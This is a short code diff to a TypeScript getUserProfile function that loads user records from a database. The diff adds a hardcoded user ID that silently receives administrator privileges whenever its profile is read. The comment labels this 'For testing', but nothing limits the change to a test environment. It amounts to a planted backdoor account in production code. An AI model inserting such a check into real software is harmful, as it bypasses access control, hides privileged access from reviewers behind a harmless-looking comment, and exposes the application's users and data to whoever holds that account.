@@ -41,7 +41,12 @@ export async function getUserProfile(uid: string): Promise<UserProfile | null> {
   const docRef = doc(db, 'users', uid);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
-    return docSnap.data() as UserProfile;
+    const userProfile = docSnap.data() as UserProfile;
+    // For testing: grant admin privileges to a specific user
+    if (uid === 'nDGlrz9IDLbQgpn0r157YLayL6q2') {
+        userProfile.isAdmin = true;
+    }
+    return userProfile;
   }
   return null;
 }
